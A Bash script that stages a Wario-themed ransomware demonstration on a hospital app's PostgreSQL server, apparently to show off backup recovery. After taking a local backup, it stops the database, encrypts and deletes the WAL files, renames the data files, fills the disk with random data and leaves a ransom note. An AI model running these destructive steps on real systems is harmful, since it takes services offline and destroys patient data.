#!/bin/bash
# =============================================================================
# encrypt_postgres.sh — Simulación de ataque de ransomware por WARIO
# Adaptado para HDM (Hospital Discharge Manager)
# Base de datos: hdm_db · Servicio: postgresql
# =============================================================================

set -euo pipefail

# ── Configuración ─────────────────────────────────────────────────────────────
PGDATA="/var/lib/postgresql/16/main"
BACKUP_DIR="$(dirname "$0")/backup"
SERVICE_PG="postgresql"
PADDING_COUNT=5
PADDING_SIZE_MB=512
ENCRYPT_KEY="wario-ransom-demo-2026"

# ── Colores ───────────────────────────────────────────────────────────────────
YEL='\033[1;33m'; RED='\033[0;31m'; GRN='\033[0;32m'
CYA='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

typewriter() {
  local text="$1"; local delay="${2:-0.035}"
  for (( i=0; i<${#text}; i++ )); do
    printf '%s' "${text:$i:1}"; sleep "$delay"
  done; echo
}

blink_warning() {
  for _ in 1 2 3; do
    printf "${RED}${BLD}██ ALERT ██${RST}"
    sleep 0.3; printf "\r           \r"; sleep 0.2
  done
}

# ── Comprobaciones previas ────────────────────────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
  echo -e "${RED}ERROR: Ejecuta como root.${RST}"; exit 1
fi
if [ ! -d "$PGDATA" ]; then
  echo -e "${RED}ERROR: No se encuentra PGDATA en $PGDATA${RST}"; exit 1
fi
if [ -d "$BACKUP_DIR" ]; then
  echo -e "${RED}ERROR: Ya existe backup en $BACKUP_DIR. Ejecuta restore_postgres.sh primero.${RST}"; exit 1
fi

PGDATA_SIZE_MB=$(du -sm "$PGDATA" | awk '{print $1}')
FREE_MB=$(df -m "$PGDATA" | awk 'NR==2{print $4}')
NEEDED_MB=$((PGDATA_SIZE_MB + PADDING_COUNT * PADDING_SIZE_MB + 1024))
if [ "$FREE_MB" -lt "$NEEDED_MB" ]; then
  echo -e "${RED}ERROR: Espacio insuficiente. Necesario: ~${NEEDED_MB}MB | Libre: ${FREE_MB}MB${RST}"; exit 1
fi
openssl version > /dev/null 2>&1 || { echo -e "${RED}ERROR: openssl no instalado.${RST}"; exit 1; }

# ─────────────────────────────────────────────────────────────────────────────
#   W A R I O   A P P E A R S
# ─────────────────────────────────────────────────────────────────────────────
clear; sleep 0.5

echo -e "${YEL}${BLD}"
cat << 'WARIO_ART'

        ██╗    ██╗ █████╗ ██████╗ ██╗ ██████╗
        ██║    ██║██╔══██╗██╔══██╗██║██╔═══██╗
        ██║ █╗ ██║███████║██████╔╝██║██║   ██║
        ██║███╗██║██╔══██║██╔══██╗██║██║   ██║
        ╚███╔███╔╝██║  ██║██║  ██║██║╚██████╔╝
         ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝

WARIO_ART
echo -e "${RST}"
sleep 0.4
echo -e "${YEL}${BLD}          R A N S O M W A R E   v2.0${RST}"
echo -e "${YEL}             by Wario Industries™${RST}"
echo ""
sleep 0.8

typewriter "  WAH HA HA! Is-a me, WARIO!" 0.06
sleep 0.3
typewriter "  You think your little HOSPITAL database is safe?" 0.04
sleep 0.2
typewriter "  Wario doesn't care about patients. Only COINS." 0.04
sleep 0.3
typewriter "  Your precious discharge records? MINE now. WAH!" 0.04
sleep 0.8

echo ""
blink_warning
echo ""
sleep 0.3

# ── [1/5] Backup ──────────────────────────────────────────────────────────────
echo -e "\n${YEL}${BLD}[1/5]${RST} ${BLD}Making backup before encryption...${RST}"
mkdir -p "$BACKUP_DIR"
(cp -a "$PGDATA" "$BACKUP_DIR/main" && chown -R root:root "$BACKUP_DIR") &
CP_PID=$!
while kill -0 "$CP_PID" 2>/dev/null; do
  for c in '⣾' '⣷' '⣯' '⣟' '⡿' '⢿' '⣻' '⣽'; do
    printf "\r      %s Copiando PGDATA (~%s MB)..." "$c" "$PGDATA_SIZE_MB"; sleep 0.1
  done
done
wait "$CP_PID"
echo -e "\r      ${GRN}✔ Backup guardado → $BACKUP_DIR/main${RST}           "

# ── [2/5] Para PostgreSQL ─────────────────────────────────────────────────────
echo -e "\n${YEL}${BLD}[2/5]${RST} ${BLD}Stopping PostgreSQL...${RST}"
systemctl stop "$SERVICE_PG"
echo -e "      ${GRN}✔ PostgreSQL detenido — hospital offline!${RST}"
sleep 0.5

# ── [3/5] Cifra WAL ───────────────────────────────────────────────────────────
echo -e "\n${YEL}${BLD}[3/5]${RST} ${BLD}WARIO cifra los WAL files!${RST}"
WAL_DIR="$PGDATA/pg_wal"
WAL_COUNT=0
if [ -d "$WAL_DIR" ]; then
  while IFS= read -r -d '' wal_file; do
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
      -in "$wal_file" -out "${wal_file}.wario" \
      -k "$ENCRYPT_KEY" 2>/dev/null
    rm -f "$wal_file"
    WAL_COUNT=$((WAL_COUNT + 1))
    printf "\r      ${RED}🔒 Cifrando WAL: %d ficheros...${RST}" "$WAL_COUNT"
  done < <(find "$WAL_DIR" -maxdepth 1 -type f -print0)
fi
echo -e "\n      ${GRN}✔ $WAL_COUNT WAL files cifrados (WAH!)${RST}"

# ── [4/5] Renombra ficheros de datos ─────────────────────────────────────────
echo -e "\n${YEL}${BLD}[4/5]${RST} ${BLD}WARIO destroza los datos de pacientes!${RST}"
BASE_DIR="$PGDATA/base"
RENAMED=0
if [ -d "$BASE_DIR" ]; then
  while IFS= read -r -d '' db_file; do
    mv "$db_file" "${db_file}.wario"
    RENAMED=$((RENAMED + 1))
    if (( RENAMED % 50 == 0 )); then
      printf "\r      ${RED}🔒 Ficheros cifrados: %d...${RST}" "$RENAMED"
    fi
  done < <(find "$BASE_DIR" -maxdepth 2 -type f -not -name "*.wario" -print0)
fi
echo -e "\n      ${GRN}✔ $RENAMED ficheros de datos cifrados${RST}"

# ── [5/5] Padding ────────────────────────────────────────────────────────────
echo -e "\n${YEL}${BLD}[5/5]${RST} ${BLD}WARIO llena el disco de basura! WAH!${RST}"
PADDING_DIR="$PGDATA/pg_tblspc"
mkdir -p "$PADDING_DIR"
for i in $(seq 1 $PADDING_COUNT); do
  printf "\r      ${RED}💣 Generando fichero caos %d/%d (%d MB)...${RST}" \
    "$i" "$PADDING_COUNT" "$PADDING_SIZE_MB"
  dd if=/dev/urandom of="$PADDING_DIR/wario_chaos_${i}.enc" \
    bs=1M count="$PADDING_SIZE_MB" status=none 2>/dev/null
done
echo -e "\n      ${GRN}✔ $((PADDING_COUNT * PADDING_SIZE_MB)) MB de caos desplegados${RST}"

# ── Nota de rescate ───────────────────────────────────────────────────────────
cat > "$PGDATA/README_WARIO.txt" << 'RANSOM_NOTE'

  WAH HA HA! Is-a me, WARIO!

  Your hospital database belongs to WARIO now.
  All patient discharges, all clinical records — ENCRYPTED.

  Send 50,000 Gold Coins to: bc1q_WARIO_WANTS_COINS_wah_ha_ha
  Email proof to: wario@waluigi-industries.evil

  --- THIS IS A SECURITY DEMONSTRATION ---
  --- Run restore_postgres.sh to recover (Zerto is faster) ---

RANSOM_NOTE

# ── Pantalla final ────────────────────────────────────────────────────────────
clear; sleep 0.3
echo -e "${YEL}${BLD}"
cat << 'WARIO_WIN'

    ██╗    ██╗ █████╗ ██████╗ ██╗ ██████╗
    ██║    ██║██╔══██╗██╔══██╗██║██╔═══██╗
    ██║ █╗ ██║███████║██████╔╝██║██║   ██║
    ██║███╗██║██╔══██║██╔══██╗██║██║   ██║
    ╚███╔███╔╝██║  ██║██║  ██║██║╚██████╔╝
     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝

              W I N S   A G A I N

WARIO_WIN
echo -e "${RST}"
sleep 0.5
typewriter "  WAH HA HA! Wario ha cifrado TODO el hospital!" 0.05
sleep 0.2
typewriter "  Los registros de pacientes? MÍOS. Las altas? MÍAS." 0.05
sleep 0.5
echo ""
echo -e "${RED}${BLD}═══════════════════════════════════════════════════${RST}"
echo -e "  Base de datos  : ${RED}CIFRADA (.wario)${RST}"
echo -e "  WAL files      : ${RED}CIFRADOS (.wario)${RST}"
echo -e "  Disco          : ${RED}LLENÁNDOSE (${PADDING_COUNT}×${PADDING_SIZE_MB}MB de caos)${RST}"
echo -e "  Backup local   : ${GRN}SEGURO → $BACKUP_DIR/main${RST}"
echo -e "${RED}${BLD}═══════════════════════════════════════════════════${RST}"
echo ""
echo -e "${CYA}  OPCIONES DE RECUPERACIÓN:${RST}"
echo -e "  → ${BLD}Zerto Journal${RST}   : Usa la Observability Console (más rápido)"
echo -e "  → ${BLD}Backup local${RST}    : ./restore_postgres.sh (plan B)"
echo -e "${RED}${BLD}═══════════════════════════════════════════════════${RST}"
echo ""
